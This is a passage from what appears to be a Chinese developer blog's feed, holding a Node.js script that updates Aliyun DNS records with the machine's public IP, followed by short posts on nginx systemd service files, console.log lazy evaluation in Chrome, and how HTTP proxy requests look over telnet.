* 规则：&lt;https://help.aliyun.com/document_detail/29747.html&gt; 1.b</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} <span class="variable">str</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percentEncode</span>(<span class="params">str</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(str).<span class="title function_">replace</span>(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%20&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;%2A&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;%7E&#x27;</span>, <span class="string">&#x27;~&#x27;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTPs GET</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> url, timeout = 5000, json = true </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> query 请求参数对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> json 如果为true并且content-type为application/json的情况下会反序列化</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> 如果响应码为4xx或者5xx响应会作为错误抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">{ url: uri, query = {}, timeout = <span class="number">5000</span>, json = <span class="literal">true</span> }</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> {</span><br><span class="line">        <span class="comment">// 合并query</span></span><br><span class="line">        <span class="keyword">const</span> urlObject = url.<span class="title function_">parse</span>(uri, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(urlObject.<span class="property">query</span>, query);</span><br><span class="line">        urlObject.<span class="property">search</span> = <span class="literal">null</span>;</span><br><span class="line">        uri = url.<span class="title function_">format</span>(urlObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// support HTTPs</span></span><br><span class="line">        <span class="keyword">let</span> protocol;</span><br><span class="line">        <span class="keyword">if</span> (urlObject.<span class="property">protocol</span> === <span class="string">&#x27;https:&#x27;</span>) protocol = https;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (urlObject.<span class="property">protocol</span> === <span class="string">&#x27;http:&#x27;</span>) protocol = http;</span><br><span class="line">        <span class="keyword">else</span> { <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`unsupported protocol [<span class="subst">${urlObject.protocol}</span>]`</span>) };</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> req = protocol.<span class="title function_">get</span>(uri)</span><br><span class="line">        req.<span class="built_in">setTimeout</span>(timeout);</span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;timeout&#x27;</span>, <span class="function">() =&gt;</span> req.<span class="title function_">abort</span>());</span><br><span class="line"></span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;response&#x27;</span>, <span class="function">(<span class="params">res</span>) =&gt;</span> {</span><br><span class="line">            res.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> { statusCode, headers } = res;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> { rawData += chunk; });</span><br><span class="line">            res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">                <span class="keyword">let</span> data = rawData;</span><br><span class="line">                <span class="keyword">if</span> (json &amp;&amp; -<span class="number">1</span> !== headers[<span class="string">&#x27;content-type&#x27;</span>].<span class="title function_">indexOf</span>(<span class="string">&#x27;application/json&#x27;</span>)) {</span><br><span class="line">                    data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (statusCode &gt;= <span class="number">400</span>) {</span><br><span class="line">                    <span class="title function_">reject</span>(data);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="title function_">resolve</span>(data);</span><br><span class="line">                }</span><br><span class="line">            });</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, reject);</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">timeout</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> {</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;operation timed out&#x27;</span>));</span><br><span class="line">        }, time);</span><br><span class="line">    });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询本机公网IP</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">findMyIP</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">const</span> rawData = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">race</span>([</span><br><span class="line">        <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;http://myip.ipip.net&#x27;</span>, <span class="attr">json</span>: <span class="literal">false</span> }),</span><br><span class="line">        <span class="comment">// request({ url: &#x27;http://ipinfo.io&#x27;, json: false }),</span></span><br><span class="line">        <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;https://api.ipify.org&#x27;</span>, <span class="attr">json</span>: <span class="literal">false</span> })</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> match = rawData.<span class="title function_">match</span>(<span class="regexp">/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/</span>);</span><br><span class="line">    <span class="keyword">if</span> (!match) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`无法解析IP。<span class="subst">${rawData}</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成公共参数</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参考：&lt;https://help.aliyun.com/document_detail/29745.html&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> accessKeyId, format = &#x27;JSON&#x27;, signatureNonce = Math.random(), timestamp = utcDateFormat(new Date()) </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generatePublicParams</span>(<span class="params">{ accessKeyId, format = <span class="string">&#x27;JSON&#x27;</span>, signatureNonce = <span class="built_in">Math</span>.random(), timestamp = utcDateFormat(<span class="keyword">new</span> <span class="built_in">Date</span>()) }</span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        <span class="string">&#x27;AccessKeyId&#x27;</span>: accessKeyId,</span><br><span class="line">        <span class="string">&#x27;Format&#x27;</span>: format,</span><br><span class="line">        <span class="string">&#x27;Version&#x27;</span>: <span class="string">&#x27;2015-01-09&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SignatureMethod&#x27;</span>: <span class="string">&#x27;HMAC-SHA1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SignatureNonce&#x27;</span>: signatureNonce,</span><br><span class="line">        <span class="string">&#x27;SignatureVersion&#x27;</span>: <span class="string">&#x27;1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Timestamp&#x27;</span>: timestamp</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 签名</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 规则：&lt;https://help.aliyun.com/document_detail/29747.html&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> params, accesskeySecret </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sign</span>(<span class="params">{ params, accesskeySecret }</span>) {</span><br><span class="line">    <span class="keyword">const</span> query = <span class="title class_">Object</span>.<span class="title function_">entries</span>(params)</span><br><span class="line">        .<span class="title function_">sort</span>(<span class="function">(<span class="params">param1, param2</span>) =&gt;</span> <span class="title function_">compareString</span>(param1[<span class="number">0</span>], param2[<span class="number">0</span>]))</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">[key, val]</span>) =&gt;</span> [<span class="title function_">percentEncode</span>(key), <span class="title function_">percentEncode</span>(val)])</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function"><span class="params">param</span> =&gt;</span> param.<span class="title function_">join</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">        .<span class="title function_">join</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> stringToSign = <span class="string">&#x27;GET&amp;&#x27;</span> + <span class="title function_">percentEncode</span>(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;&amp;&#x27;</span> + <span class="title function_">percentEncode</span>(query);</span><br><span class="line">    <span class="keyword">const</span> signStr = <span class="title function_">sha1</span>(stringToSign, <span class="string">`<span class="subst">${accesskeySecret}</span>&amp;`</span>);</span><br><span class="line">    <span class="keyword">return</span> signStr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 请求接口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> params, accessKeyId, accesskeySecret </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">callApi</span>(<span class="params">{ params, accessKeyId, accesskeySecret }</span>) {</span><br><span class="line">    <span class="comment">// 签名</span></span><br><span class="line">    <span class="keyword">const</span> signStr = <span class="title function_">sign</span>({ params, accesskeySecret });</span><br><span class="line">    params[<span class="string">&#x27;Signature&#x27;</span>] = signStr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">request</span>({ <span class="attr">url</span>: <span class="string">&#x27;https://alidns.aliyuncs.com/&#x27;</span>, <span class="attr">query</span>: params });</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取解析记录列表</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考：&lt;https://help.aliyun.com/document_detail/29776.html&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> domainName, rrKeyWord, pageNumber = 1, pageSize = 20, typeKeyWord = &#x27;A&#x27;, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">describeDomainRecords</span>(<span class="params">{ domainName, rrKeyWord, pageNumber = <span class="number">1</span>, pageSize = <span class="number">20</span>, typeKeyWord = <span class="string">&#x27;A&#x27;</span>, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET }</span>) {</span><br><span class="line">    <span class="keyword">const</span> params = {</span><br><span class="line">        <span class="string">&#x27;Action&#x27;</span>: <span class="string">&#x27;DescribeDomainRecords&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DomainName&#x27;</span>: domainName,</span><br><span class="line">        <span class="string">&#x27;PageNumber&#x27;</span>: pageNumber,</span><br><span class="line">        <span class="string">&#x27;PageSize&#x27;</span>: pageSize,</span><br><span class="line">        <span class="string">&#x27;RRKeyWord&#x27;</span>: rrKeyWord,</span><br><span class="line">        <span class="string">&#x27;TypeKeyWord&#x27;</span>: typeKeyWord</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(params, <span class="title function_">generatePublicParams</span>({ accessKeyId }));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> resp = <span class="keyword">await</span> <span class="title function_">callApi</span>({ params, accessKeyId, accesskeySecret });</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改解析记录</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参考：&lt;https://help.aliyun.com/document_detail/29774.html&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> {<span class="type">*</span>} {<span class="type"> recordId, rr, value, type = &#x27;A&#x27;, ttl = 600, line = &#x27;default&#x27;, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ttl 基础版最小600秒</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">updateDomainRecord</span>(<span class="params">{ recordId, rr, value, type = <span class="string">&#x27;A&#x27;</span>, ttl = <span class="number">600</span>, line = <span class="string">&#x27;default&#x27;</span>, accessKeyId = ACCESS_KEY_ID, accesskeySecret = ACCESS_KEY_SECRET }</span>) {</span><br><span class="line">    <span class="keyword">const</span> params = {</span><br><span class="line">        <span class="string">&#x27;Action&#x27;</span>: <span class="string">&#x27;UpdateDomainRecord&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;RecordId&#x27;</span>: recordId,</span><br><span class="line">        <span class="string">&#x27;RR&#x27;</span>: rr,</span><br><span class="line">        <span class="string">&#x27;Type&#x27;</span>: type,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span>: value,</span><br><span class="line">        <span class="string">&#x27;TTL&#x27;</span>: ttl,</span><br><span class="line">        <span class="string">&#x27;Line&#x27;</span>: line</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(params, <span class="title function_">generatePublicParams</span>({ accessKeyId }));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> resp = <span class="keyword">await</span> <span class="title function_">callApi</span>({ params, accessKeyId, accesskeySecret });</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// findMyIP().then(console.log).catch(console.error);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// describeDomainRecords({ domainName: &#x27;kekek.cc&#x27;, rrKeyWord: &#x27;www&#x27; }).then((recoder) =&gt; {</span></span><br><span class="line"><span class="comment">//     console.log(JSON.stringify(recoder, null, 2))</span></span><br><span class="line"><span class="comment">// }).catch(console.error)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// updateDomainRecord({ recordId: &#x27;3535020439014400&#x27;, rr: &#x27;www&#x27;, value: &#x27;202.106.0.21&#x27; }).then(console.log).catch(console.error)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ========================================&gt;</span></span><br><span class="line"></span><br><span class="line">(<span class="title function_">async</span> () =&gt; {</span><br><span class="line">    <span class="comment">// 要更新的域名</span></span><br><span class="line">    <span class="keyword">let</span> records = [];</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        records = <span class="built_in">require</span>(<span class="string">&#x27;./domains.json&#x27;</span>);</span><br><span class="line">    } <span class="keyword">catch</span> (ignored) {</span><br><span class="line">        records = [</span><br><span class="line">            {</span><br><span class="line">                <span class="attr">domainName</span>: <span class="string">&#x27;kekek.cc&#x27;</span>,</span><br><span class="line">                <span class="attr">rrKeyWord</span>: <span class="string">&#x27;www&#x27;</span></span><br><span class="line">            },</span><br><span class="line">            {</span><br><span class="line">                <span class="attr">domainName</span>: <span class="string">&#x27;kekek.cc&#x27;</span>,</span><br><span class="line">                <span class="attr">rrKeyWord</span>: <span class="string">&#x27;@&#x27;</span></span><br><span class="line">            }</span><br><span class="line">        ];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> myip = <span class="keyword">await</span> <span class="title function_">findMyIP</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> record <span class="keyword">of</span> records) {</span><br><span class="line">        <span class="keyword">const</span> recordDetails = <span class="keyword">await</span> <span class="title function_">describeDomainRecords</span>(record);</span><br><span class="line">        <span class="keyword">const</span> recordDetail = recordDetails.<span class="property">DomainRecords</span>.<span class="property">Record</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">_record</span> =&gt;</span> _record.<span class="property">RR</span> === record.<span class="property">rrKeyWord</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recordDetail &amp;&amp; recordDetail[<span class="string">&#x27;Value&#x27;</span>] !== myip) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[update] domainName: %s, rr: %s, before: %s, after: %s&#x27;</span>, record.<span class="property">domainName</span>, record.<span class="property">rrKeyWord</span>, recordDetail[<span class="string">&#x27;Value&#x27;</span>], myip);</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">updateDomainRecord</span>({ <span class="attr">recordId</span>: recordDetail[<span class="string">&#x27;RecordId&#x27;</span>], <span class="attr">rr</span>: record.<span class="property">rrKeyWord</span>, <span class="attr">value</span>: myip, <span class="attr">ttl</span>: record.<span class="property">ttl</span> });</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">})().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>())).<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span><br></pre></td></tr></table></figure><p>缺陷：DNS是有缓存的，更新了新的解析后不能立即生效。这样网站会在一段时间内不可用。</p><blockquote><p>缓存的问题可以通过购买DNSvip服务实现最低1秒的缓存。</p></blockquote><h3 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h3><p>旧电脑或者树莓派</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Systemd</title>
      <link href="/post/systemd.html"/>
      <url>/post/systemd.html</url>
      
        <content type="html"><![CDATA[<h2 id="Systemd"><a href="#Systemd" class="headerlink" title="Systemd"></a>Systemd</h2><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><p>vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;nginx.service</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=The NGINX HTTP and reverse proxy server</span><br><span class="line">After=syslog.target network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/sbin/nginx -t</span><br><span class="line">ExecStart=/usr/sbin/nginx</span><br><span class="line">ExecReload=/usr/sbin/nginx -s reload</span><br><span class="line">ExecStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><h3 id="初始化时自动启动服务"><a href="#初始化时自动启动服务" class="headerlink" title="初始化时自动启动服务"></a>初始化时自动启动服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /lib/systemd/system/nginx.service  /etc/systemd/system/multi-user.target.wants/nginx.service</span><br></pre></td></tr></table></figure><p>或者 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure><h3 id="刷新配置"><a href="#刷新配置" class="headerlink" title="刷新配置"></a>刷新配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><h3 id="启动、重启、停止"><a href="#启动、重启、停止" class="headerlink" title="启动、重启、停止"></a>启动、重启、停止</h3><ol><li><p>启动nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start nginx</span><br></pre></td></tr></table></figure></li><li><p>重启nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart nginx</span><br></pre></td></tr></table></figure></li><li><p>停止nginx</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl stop nginx</span><br></pre></td></tr></table></figure></li></ol><h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure><h3 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/chwshuang/article/details/68489968">systemctl管理Redis启动、停止、开机启动</a></li><li><a href="https://www.nginx.com/resources/wiki/start/topics/examples/systemd/">NGINX systemd service file</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> systemctl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>console.log的延迟计算</title>
      <link href="/post/lazy-evaluation-of-console-log.html"/>
      <url>/post/lazy-evaluation-of-console-log.html</url>
      
        <content type="html"><![CDATA[<h2 id="console-log的延迟计算"><a href="#console-log的延迟计算" class="headerlink" title="console.log的延迟计算"></a>console.log的延迟计算</h2><p>我们调试JavaScript时经常会用到<code>console.log</code>打印，但是<code>console.log</code>打印对象时不那么准确。看下面的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123; <span class="attr">name</span>: <span class="string">&#x27;Ming&#x27;</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">user.<span class="property">name</span> = <span class="string">&#x27;Lee&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/console-log-lazy-evaluation.jpeg"></p><p><code>user.name</code>的初始值为<code>Ming</code>，打印<code>user</code>看到的<code>name</code>值也是<code>Ming</code>。紧接着修改<code>user.name</code>值为<code>Lee</code>，然后再暂开前面打印<code>user</code>对象就看到<code>name</code>值变成了<code>Lee</code>。</p><p>这个展开看到的值是Chrome为了优化<code>console.log</code>进行的延迟计算，我们看到对象展开后的值是在展开时实时计算的。如果留意在展开对象时会有一个提示<code>Value below was evaluated just now.</code>。</p><p>为了避免上述问题在打印对象时可以将对象序列化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user, <span class="literal">null</span>, <span class="number">2</span>)); <span class="comment">// 格式化</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP代理服务器</title>
      <link href="/post/http-proxy.html"/>
      <url>/post/http-proxy.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP代理服务器"><a href="#HTTP代理服务器" class="headerlink" title="HTTP代理服务器"></a>HTTP代理服务器</h2><p>科学上网和调试网站时经常会用到代理服务器，那么代理服务器是怎么实现的呢？代理服务器和web服务器本身没有太多差别，如果是走代理请求浏览器会把请求发送到代理服务器，并且请求报文中使用<strong>完整URI</strong>（参考下图中a&#x2F;b）。</p><p><img src="/images/http-proxy.png"></p><p>使用telnet模拟普通请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ telnet css.kekek.cc 80</span><br><span class="line">Trying 47.94.202.145...</span><br><span class="line">Connected to css.kekek.cc.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">GET / HTTP/1.0</span><br><span class="line">host: css.kekek.cc</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Fri, 24 Aug 2018 08:48:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 3876</span><br><span class="line">Last-Modified: Thu, 03 May 2018 13:28:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;5aeb0e66-f24&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用telnet模拟显示代理请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ telnet proxy.kekek.cc 1337</span><br><span class="line">Trying 39.106.12.213...</span><br><span class="line">Connected to proxy.kekek.cc.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">GET http://css.kekek.cc/ HTTP/1.0</span><br><span class="line">host: css.kekek.cc</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">server: openresty</span><br><span class="line">date: Fri, 24 Aug 2018 08:50:21 GMT</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br><span class="line">content-length: 3876</span><br><span class="line">last-modified: Thu, 03 May 2018 13:28:06 GMT</span><br><span class="line">connection: close</span><br><span class="line">etag: &quot;5aeb0e66-f24&quot;</span><br><span class="line">accept-ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>HTTPS模式下的代理和HTTP方式会有所不同，因为我们无法解析HTTPS请求。针对这种情况只能使用透传的方式，在tcp层直接将请求转发到目标服务器即可。</p><h3 id="PAC"><a 